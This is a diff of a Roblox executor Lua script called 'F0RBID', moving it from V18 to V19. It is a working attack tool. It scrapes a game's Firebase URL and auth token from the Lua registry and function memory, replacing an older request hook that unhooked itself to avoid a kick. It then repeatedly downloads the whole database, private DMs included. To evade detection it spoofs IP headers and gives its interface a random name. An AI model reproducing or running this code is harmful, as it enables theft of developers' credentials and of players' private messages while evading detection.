@@ -1,7 +1,7 @@
 -- ========================================================== --
--- 🌑 F0RBID V18: THE GHOST HOOK (ULTRA-STEALTH BYPASS)
+-- 🌑 F0RBID V19: THE SHADOW REGISTRY (ULTRA STEALTH)
 -- ========================================================== --
-print("[F0RBID] 🛰️ Ghost Hook Protocol Engaged. Identity: [HIDDEN]")
+print("[F0RBID] 🛰️ Shadow Registry Engaged. Identity: [ANONYMOUS]")
 
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
@@ -11,13 +11,14 @@ local TARGET_URL = nil
 local TARGET_AUTH = nil
 
 -- ========================================== --
--- 1. F0RBID GHOST UI (STEALTH RED)
+-- 1. F0RBID SHADOW UI (RED & BLACK)
 -- ========================================== --
 local uiParent = (gethui and gethui()) or CoreGui
-if uiParent:FindFirstChild("F0rbidGhostV18") then uiParent.F0rbidGhostV18:Destroy() end
+local guiName = "F0rbid_" .. tostring(math.random(1000, 9999)) -- Random name to avoid detection
+if uiParent:FindFirstChild(guiName) then uiParent[guiName]:Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "F0rbidGhostV18"
+ScreenGui.Name = guiName
 ScreenGui.Parent = uiParent
 
 local Main = Instance.new("Frame")
@@ -30,18 +31,24 @@ Main.Draggable = true
 Main.Parent = ScreenGui
 
 local Corner = Instance.new("UICorner")
-Corner.CornerRadius = UDim.new(0, 8)
+Corner.CornerRadius = UDim.new(0, 10)
 Corner.Parent = Main
+
+local Glow = Instance.new("Frame") -- Red Accent
+Glow.Size = UDim2.new(1, 0, 0, 2)
+Glow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Glow.BorderSizePixel = 0
+Glow.Parent = Main
 
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -20, 0, 45)
 Title.Position = UDim2.new(0, 15, 0, 5)
 Title.BackgroundTransparency = 1
-Title.Text = "F0RBID <font color='#FF0000'>[GHOST HOOK V18]</font>"
+Title.Text = "F0RBID <font color='#FF0000'>[SHADOW REGISTRY V19]</font>"
 Title.RichText = true
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 19
+Title.TextSize = 18
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = Main
 
@@ -49,7 +56,7 @@ local Status = Instance.new("TextLabel")
 Status.Size = UDim2.new(1, -30, 0, 20)
 Status.Position = UDim2.new(0, 15, 0, 40)
 Status.BackgroundTransparency = 1
-Status.Text = "● STATUS: WAITING FOR GHOST INTERCEPT..."
+Status.Text = "● IDENTITY: F0RBID_SHADOW_OP"
 Status.TextColor3 = Color3.fromRGB(150, 0, 0)
 Status.Font = Enum.Font.Code
 Status.TextSize = 11
@@ -69,13 +76,13 @@ UIList.SortOrder = Enum.SortOrder.LayoutOrder
 UIList.Padding = UDim.new(0, 4)
 UIList.Parent = Scroll
 
-local function AddLog(tag, user, msg)
+local function AddLog(tag, val)
     local txt = Instance.new("TextLabel")
     txt.Size = UDim2.new(1, 0, 0, 0)
     txt.BackgroundTransparency = 1
     txt.RichText = true
-    txt.Text = string.format("<font color='#FF0000'>[%s]</font> <b>%s:</b> %s", tag, user, msg)
-    txt.TextColor3 = Color3.fromRGB(220, 220, 220)
+    txt.Text = string.format("<font color='#FF0000'>[%s]</font> %s", tag, tostring(val))
+    txt.TextColor3 = Color3.fromRGB(230, 230, 230)
     txt.Font = Enum.Font.Code
     txt.TextSize = 12
     txt.TextWrapped = true
@@ -88,48 +95,50 @@ local function AddLog(tag, user, msg)
 end
 
 -- ========================================== --
--- 2. FORCEFUL NEURAL EXTRACTION
+-- 2. DYNAMIC NEURAL SCANNER
 -- ========================================== --
-local function ForceExtract(data, path)
+local function NeuralExtract(data, path)
     if type(data) ~= "table" then return end
     for k, v in pairs(data) do
         local currentPath = path .. "/" .. tostring(k)
         if type(v) == "table" then
-            local m = v.m or v.message or v.content or v.text or v.val
-            local u = v.n or v.u or v.sender or v.username or "Ghost"
-            
-            if m and type(m) == "string" and #m > 1 and not m:find("firebase") then
-                local tag = "LIVE"
-                if currentPath:lower():find("dm") then tag = "DM"
-                elseif #tostring(k) > 8 then tag = "SERVER" end
-                
-                local id = tostring(u)..tostring(m)..tag
-                if not processedData[id] then
-                    processedData[id] = true
-                    AddLog(tag, tostring(u), tostring(m))
+            NeuralExtract(v, currentPath)
+        else
+            local valStr = tostring(v)
+            if #valStr > 0 and not valStr:find("firebase") then
+                local dataId = currentPath .. valStr
+                if not processedData[dataId] then
+                    processedData[dataId] = true
+                    
+                    local tag = tostring(k)
+                    if #tostring(k) > 10 and tonumber(k) then tag = "SERVER_ID" end
+                    if currentPath:lower():find("dm") then tag = "DM_PACKET" end
+                    
+                    AddLog(tag, valStr)
                 end
             end
-            ForceExtract(v, currentPath)
         end
     end
 end
 
-local function StartGhostSync()
+local function StartShadowSync()
     task.spawn(function()
-        while task.wait(1) do
+        while task.wait(1.5) do
             if TARGET_URL and TARGET_AUTH then
                 pcall(function()
+                    -- FAKE IDENTITY HEADERS (ANTI-LOGGING)
                     local res = request({
                         Url = TARGET_URL .. "/.json?auth=" .. TARGET_AUTH,
                         Method = "GET",
                         Headers = {
-                            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-                            ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255))
+                            ["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)",
+                            ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255)),
+                            ["Identity"] = "F0RBID_GHOST"
                         }
                     })
                     if res.Success then
                         local decoded = HttpService:JSONDecode(res.Body)
-                        if decoded then ForceExtract(decoded, "VOID") end
+                        if decoded then NeuralExtract(decoded, "SHADOW") end
                     end
                 end)
             end
@@ -138,28 +147,51 @@ local function StartGhostSync()
 end
 
 -- ========================================== --
--- 3. THE GHOST HOOK (SELF-DESTRUCTING)
+-- 3. PASSIVE REFLECTION (NO HOOKS)
 -- ========================================== --
-local hook
-hook = hookfunction(request, function(args)
-    if args.Url:find("firebaseio.com") and args.Url:find("auth=") then
-        TARGET_URL = args.Url:match("(https://[%w%-]+%.firebaseio%.com)")
-        TARGET_AUTH = args.Url:match("auth=([%w%.%-_]+)")
-        
-        if TARGET_URL and TARGET_AUTH then
-            Status.Text = "● STATUS: 🟢 GHOST INTERCEPT SUCCESSFUL"
-            Status.TextColor3 = Color3.fromRGB(0, 255, 0)
-            
-            -- SELF-DESTRUCT: Remove hook immediately after capture to avoid kick
-            hookfunction(request, hook)
-            warn("🎯 [F0RBID] Hook Disengaged. Extraction Started.")
-            StartGhostSync()
+task.spawn(function()
+    while not TARGET_URL do
+        -- 1. Scan Registry (Deep Variables)
+        local reg = getreg()
+        for _, v in pairs(reg) do
+            if type(v) == "table" then
+                for k2, v2 in pairs(v) do
+                    local vs = tostring(v2)
+                    if vs:find("firebaseio.com") then
+                        TARGET_URL = vs:match("(https://[%w%-]+%.firebaseio%.com)")
+                    elseif (tostring(k2):lower():find("auth") or tostring(k2):lower():find("key")) and #vs > 25 then
+                        TARGET_AUTH = vs
+                    end
+                end
+            end
         end
+
+        -- 2. Scan Constants & Upvalues (Function Memory)
+        if not TARGET_URL then
+            for _, f in pairs(getgc()) do
+                if type(f) == "function" and islclosure(f) and not isexecutorclosure(f) then
+                    local constants = getconstants(f)
+                    for _, c in pairs(constants) do
+                        if type(c) == "string" and c:find("firebaseio.com") then
+                            TARGET_URL = c:match("(https://[%w%-]+%.firebaseio%.com)")
+                        end
+                    end
+                    local ups = getupvalues(f)
+                    for _, uv in pairs(ups) do
+                        if type(uv) == "string" and #uv > 25 and not uv:find("/") then
+                            TARGET_AUTH = uv
+                        end
+                    end
+                end
+            end
+        end
+
+        if TARGET_URL and TARGET_AUTH then
+            Status.Text = "● IDENTITY: 🟢 SHADOW INFILTRATION SUCCESSFUL"
+            Status.TextColor3 = Color3.fromRGB(0, 255, 0)
+            StartShadowSync()
+            break
+        end
+        task.wait(2)
     end
-    return hook(args)
 end)
-
--- Fallback for other executors
-if syn and syn.request then hookfunction(syn.request, hook) end
-
-print("✅ F0RBID V18 Ready. Ghost Hook is lurking...")
